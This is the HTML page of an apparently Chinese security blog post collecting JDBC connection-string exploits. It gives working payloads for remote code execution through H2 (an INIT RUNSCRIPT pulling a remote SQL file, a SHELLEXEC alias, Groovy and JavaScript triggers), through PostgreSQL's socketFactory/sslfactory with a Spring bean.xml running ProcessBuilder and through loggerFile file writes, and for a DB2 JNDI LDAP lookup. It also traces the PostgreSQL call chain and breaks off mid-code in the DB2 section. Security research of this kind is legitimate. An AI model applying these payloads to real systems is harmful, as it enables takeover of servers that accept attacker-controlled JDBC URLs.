@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>JDBC-Attack 利用汇总 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="JDBC-Attack 利用汇总 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/10/01/JDBC-Attack%20%E5%88%A9%E7%94%A8%E6%B1%87%E6%80%BB/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-10-01T02:36:24.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>October</span>
+            <span>1,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">JDBC-Attack 利用汇总</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/32634994/1693894592214-eb7779fc-d146-450a-8e84-2a4761d0dec6.jpeg#averageHue=%23a9a090&clientId=u5b0ef69b-b84a-4&from=paste&height=534&id=u7cc17358&originHeight=846&originWidth=564&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45363&status=done&style=none&taskId=uae236f0e-330b-4fa6-82cd-ef71ca6704b&title=&width=356.20001220703125" alt="johan5.jpg"><br>JDBC的路漫漫，之前只学过mysql的JDBC RCE，趁此机会补一下</p>
+<h1 id="H2-RCE"><a href="#H2-RCE" class="headerlink" title="H2 RCE"></a>H2 RCE</h1><p>H2数据库是之前不怎么见到过的一款数据库，之前都不清楚可以RCE，但从最近爆出的MetaBase 2023 的CVE来看还是挺重要的，所以趁着这个机会给他一起学一下。</p>
+<h2 id="INIT-RunScript-RCE"><a href="#INIT-RunScript-RCE" class="headerlink" title="INIT RunScript RCE"></a>INIT RunScript RCE</h2><p>在H2数据库进行初始化的时候或者当我们可以控制JDBC链接时即可完成RCE，并且有很多利用，首先就是INIT,进行H2连接的时候可以执行一段SQL脚本，我们可以构造恶意的脚本去RCE<br>poc.sql</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS <span class="keyword">EXEC</span> <span class="keyword">AS</span> <span class="string">&#x27;String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return &quot;su18&quot;;&#125;&#x27;</span>;<span class="keyword">CALL</span> <span class="keyword">EXEC</span> (<span class="string">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>然后在初始化的时候指定JDBC链接为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT<span class="operator">=</span><span class="number">3</span>;INIT<span class="operator">=</span>RUNSCRIPT <span class="keyword">FROM</span> <span class="string">&#x27;http://127.0.0.1:8000/poc.sql&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>其中<code>INIT=RUNSCRIPT FROM &#39;[http://127.0.0.1:8000/poc.sql&#39;](http://127.0.0.1:8000/poc.sql&#39;)</code>就会去获取恶意的sql脚本，进而RCE<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693886102670-0f1fff98-c406-4776-a7cb-b4c5894039e7.png#averageHue=%23eeeada&clientId=u491302a1-b7ca-4&from=paste&height=755&id=uea45cb61&originHeight=944&originWidth=2496&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1040318&status=done&style=none&taskId=u679aec7a-5864-4884-87db-b8370546db6&title=&width=1996.8" alt="image.png"><br>不出意外完美的RCE了~</p>
+<h2 id="Alias-Script-RCE"><a href="#Alias-Script-RCE" class="headerlink" title="Alias Script RCE"></a>Alias Script RCE</h2><p>假如可以执行任意H2 SQL的语句，那么也可以完成RCE，其实上述的INIT实质上也就是执行任意H2的sql语句。而执行语句也有很多讲究。对于上述的INIT需要出网，而我们可以利用加载字节码达到不出网RCE的效果，类似于SPEL以及OGNL注入内存马。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//创建别名</span><br><span class="line">CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;;  &#125;$$;</span><br><span class="line"></span><br><span class="line">//调用SHELLEXEC执行命令</span><br><span class="line">CALL SHELLEXEC(&#x27;id&#x27;);</span><br><span class="line">CALL SHELLEXEC(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693886569008-c9bc5a2f-2eb5-4caf-b403-a1c286cbbd39.png#averageHue=%23f4f1e7&clientId=u491302a1-b7ca-4&from=paste&height=390&id=uabd5076c&originHeight=487&originWidth=1676&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36622&status=done&style=none&taskId=uc88d0a50-9173-4f2c-b39c-b9ad10f55ba&title=&width=1340.8" alt="image.png"><br>这样也可以RCE，所以H2的攻击面是很多的</p>
+<h2 id="TRIGGER-Script-RCE"><a href="#TRIGGER-Script-RCE" class="headerlink" title="TRIGGER Script RCE"></a>TRIGGER Script RCE</h2><p>除了Alias别名还可以用TRIGGER去手搓groovy或者js代码去rce，但是groovy依赖一般都是不会有的，所以js是更加通用的选择。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693887219302-ab0c251d-6414-462d-a9a0-0fd08b5eecb2.png#averageHue=%232d2c2c&clientId=u491302a1-b7ca-4&from=paste&height=243&id=u2da00670&originHeight=304&originWidth=1004&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=68821&status=done&style=none&taskId=u98f247f5-3445-4df5-b3f1-1b9c4937109&title=&width=803.2" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static boolean isGroovySource(String var0) &#123;</span><br><span class="line">  return var0.startsWith(&quot;//groovy&quot;) || var0.startsWith(&quot;@groovy&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里是groovy执行命令的逻辑，对应的exp是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(&quot;org.h2.Driver&quot;);</span><br><span class="line">String groovy = &quot;@groovy.transform.ASTTest(value=&#123;&quot; + &quot; assert java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot; + &quot;&#125;)&quot; + &quot;def x&quot;;</span><br><span class="line">String url    = &quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS &#x27;&quot; + groovy + &quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+<p>然后就是最常用的JS代码了，我们也可以利用JS加载内存马，但是要看是什么中间件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE TRIGGER poc2 BEFORE SELECT ON</span><br><span class="line">INFORMATION_SCHEMA.TABLES AS $$//javascript</span><br><span class="line">java.lang.Runtime.getRuntime().exec(&quot;calc&quot;) $$;</span><br></pre></td></tr></table></figure>
+<p>假如你想加载内存马你可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45603443/article/details/126698982">https://blog.csdn.net/qq_45603443&#x2F;article&#x2F;details&#x2F;126698982</a><br>这是基于SpringBoot的内存马</p>
+<h1 id="Mysql-JDBC-RCE"><a href="#Mysql-JDBC-RCE" class="headerlink" title="Mysql JDBC RCE"></a>Mysql JDBC RCE</h1><p>年轻时期的pop早已学习<br><a target="_blank" rel="noopener" href="https://www.yuque.com/boogipop/iwyn7t/nylflyac8hw3p1ip?view=doc_embed">WebDog必学的JDBC反序列化</a><br>mysql的JDBC反序列化是最常见的。。。</p>
+<h1 id="PostgreSQL-JDBC-RCE"><a href="#PostgreSQL-JDBC-RCE" class="headerlink" title="PostgreSQL JDBC RCE"></a>PostgreSQL JDBC RCE</h1><h2 id="socketFactory-x2F-socketFactoryArg-RCE"><a href="#socketFactory-x2F-socketFactoryArg-RCE" class="headerlink" title="socketFactory&#x2F;socketFactoryArg RCE"></a>socketFactory&#x2F;socketFactoryArg RCE</h2><p>POP只在CTFSHOW的题目稍稍微微的看到了一下，这就来复现分析一波~</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.jdbc.postgres;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PsqlJDBCRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryClass</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryArg</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/bean.xml&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=&quot;</span>+socketFactoryClass+ <span class="string">&quot;&amp;socketFactoryArg=&quot;</span>+socketFactoryArg;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(jdbcUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.postgresql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>postgresql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>42.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">&lt;/dependency</span><br></pre></td></tr></table></figure>
+<p>bean.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;calc.exe&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123; pb.start() &#125;&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693890654567-8537c8ca-f90d-4a96-a0f1-29d0ebecffe4.png#averageHue=%23444d50&clientId=u66c29c7a-5f8d-4&from=paste&height=798&id=ube9113fd&originHeight=998&originWidth=1500&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1370787&status=done&style=none&taskId=uaa44fbd6-430f-4cc4-878b-43666d80a1c&title=&width=1200" alt="image.png"><br>利用到了一个类，之前学spring经常用到的，操控bean的类，ClassPathXmlApplicationContext.class</p>
+<h2 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h2><p>先知社区其实有一个很好理解的图<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693890747860-cb478a48-8f98-4e71-a9fd-6c99f9ab6a1c.png#averageHue=%23f3f3f3&clientId=u66c29c7a-5f8d-4&from=paste&height=604&id=ue204b2df&originHeight=755&originWidth=1282&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=232495&status=done&style=none&taskId=ue8098a1f-74c2-45ef-a755-eff453bef7b&title=&width=1025.6" alt="image.png"><br>在psql的jdbc初始化的时候会读取jdbc链接里的某个参数，并且进行一些操作。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693890796599-bf4c8965-f06b-4290-b50f-2a8e3d6dd169.png#averageHue=%23494e55&clientId=u66c29c7a-5f8d-4&from=paste&height=850&id=u74b91020&originHeight=1062&originWidth=1283&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1288021&status=done&style=none&taskId=u39daa9dd-045b-4550-8c41-d010b4ee7bd&title=&width=1026.4" alt="image.png"><br>首先进入这个connect方法。随后进入makeconnect，携带2个参数，url和props，分别如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693890830832-09dcb446-f1ac-4beb-b820-273ba89f1cd1.png#averageHue=%23484c54&clientId=u66c29c7a-5f8d-4&from=paste&height=830&id=u5a57796a&originHeight=1038&originWidth=1049&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=998630&status=done&style=none&taskId=u992a2db1-faac-4a78-858e-c1b6cd9df47&title=&width=839.2" alt="image.png"><br>重点关注一下socketFactory的参数以及socketFactoryargs这两个参数，他们最后会进行实例化相关的操作。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693890866504-f5f6bf0d-b44c-458d-8e91-9ed59512b356.png#averageHue=%235a5e66&clientId=u66c29c7a-5f8d-4&from=paste&height=242&id=u7e2831cf&originHeight=302&originWidth=1025&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=270010&status=done&style=none&taskId=uf310b8ca-162d-445e-a40e-b5e7ba828d5&title=&width=820" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693890877342-7886e399-c20f-42df-a62b-bf2abeac2d51.png#averageHue=%23444850&clientId=u66c29c7a-5f8d-4&from=paste&height=710&id=u66952344&originHeight=887&originWidth=867&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=679582&status=done&style=none&taskId=ub4644cdf-6c54-4aa6-b73a-455cfddfaf5&title=&width=693.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693890891966-c6fb7ccb-703c-4a39-a0bd-ca3e0bcaaa3b.png#averageHue=%23474c53&clientId=u66c29c7a-5f8d-4&from=paste&height=954&id=u13c8de6d&originHeight=1193&originWidth=1547&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1629870&status=done&style=none&taskId=uc9aff470-b1e7-4bd0-9fa3-9df036e3ae2&title=&width=1237.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693890905092-8f66849f-107c-40ac-a14b-e5d22813766f.png#averageHue=%23464b53&clientId=u66c29c7a-5f8d-4&from=paste&height=790&id=u2094531c&originHeight=987&originWidth=1183&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1009510&status=done&style=none&taskId=u77193342-759a-4d79-8e35-9d4b69a87f4&title=&width=946.4" alt="image.png"><br>以上四步都是一些初始化准备过程，然后接下来会进入到<code>ObjectFactory.instantiate</code>方法，在这里进行实例化相关操作<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693890945692-57fc288e-7bd1-41f7-b4f4-60b1a93e5eb1.png#averageHue=%234c5057&clientId=u66c29c7a-5f8d-4&from=paste&height=850&id=u4688ab52&originHeight=1062&originWidth=1201&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1069898&status=done&style=none&taskId=u3aac3b3a-02e8-460a-a1da-4cdd155f409&title=&width=960.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1693890954039-87c42850-69fd-4e42-a22f-2fcae68e6b02.png#averageHue=%234b4f56&clientId=u66c29c7a-5f8d-4&from=paste&height=1010&id=ub1bc36d6&originHeight=1263&originWidth=1330&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1367719&status=done&style=none&taskId=u209321b0-6f62-49cc-91d6-f96a8ebb2c6&title=&width=1064" alt="image.png"><br>实例化了刚刚说的CPX类，读取一个xml文件，实例化某个bean，导致了RCE</p>
+<h2 id="socketFactory-x2F-socketFactoryArg-RCE-1"><a href="#socketFactory-x2F-socketFactoryArg-RCE-1" class="headerlink" title="socketFactory&#x2F;socketFactoryArg RCE"></a>socketFactory&#x2F;socketFactoryArg RCE</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.jdbc.postgres;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PsqlJDBCRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryClass</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryArg</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/bean.xml&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://127.0.0.1:5432/test/?sslfactory=&quot;</span>+socketFactoryClass+ <span class="string">&quot;&amp;sslfactory=&quot;</span>+socketFactoryArg;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(jdbcUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>其余不变，原理一模一样，代替品<br>但是好像需要密码认证？</p>
+<h2 id="loggerLevel-x2F-loggerFile-任意文件写入"><a href="#loggerLevel-x2F-loggerFile-任意文件写入" class="headerlink" title="loggerLevel&#x2F;loggerFile 任意文件写入"></a>loggerLevel&#x2F;loggerFile 任意文件写入</h2><p>这个也是需要密码的。实用性也不是很大</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.jdbc.postgres;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PsqlJDBCRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryClass</span> <span class="operator">=</span> <span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">socketFactoryArg</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/bean.xml&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerLevel</span> <span class="operator">=</span> <span class="string">&quot;debug&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">loggerFile</span> <span class="operator">=</span> <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line">        String shellContent=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">        <span class="comment">//String jdbcUrl = &quot;jdbc:postgresql://127.0.0.1:5432/test/?socketFactory=&quot;+socketFactoryClass+ &quot;&amp;socketFactoryArg=&quot;+socketFactoryArg;</span></span><br><span class="line">        <span class="comment">//String jdbcUrl = &quot;jdbc:postgresql://127.0.0.1:5432/test/?sslfactory=&quot;+socketFactoryClass+ &quot;&amp;sslfactoryarg=&quot;+socketFactoryArg;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbcUrl</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://127.0.0.1:5432/test?loggerLevel=&quot;</span>+loggerLevel+<span class="string">&quot;&amp;loggerFile=&quot;</span>+loggerFile+ <span class="string">&quot;&amp;&quot;</span>+shellContent;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(jdbcUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="IBM-DB2-JDBC-JNDI-RCE"><a href="#IBM-DB2-JDBC-JNDI-RCE" class="headerlink" title="IBM DB2 JDBC JNDI RCE"></a>IBM DB2 JDBC JNDI RCE</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.ibm.db2<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>11.5.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>首先是环境搭建，需要搭建一个DB2的数据库，这里我就直接拉docker了。<br><code>docker pull ibmcom/db2express-c:latest</code><br><code>docker run -d --name db2 --privileged=true -p 50000:50000 -e DB2INST1_PASSWORD=db2admin -e LICENSE=accept ibmcom/db2express-c db2start</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.jdbc.DB2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DB2JDBCRCE</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>);</span><br><span class="line">        DriverManager.getConnection(<span class="string">&quot;jdbc:db2://127.0.0.1:50000/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/fgfhjn;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span 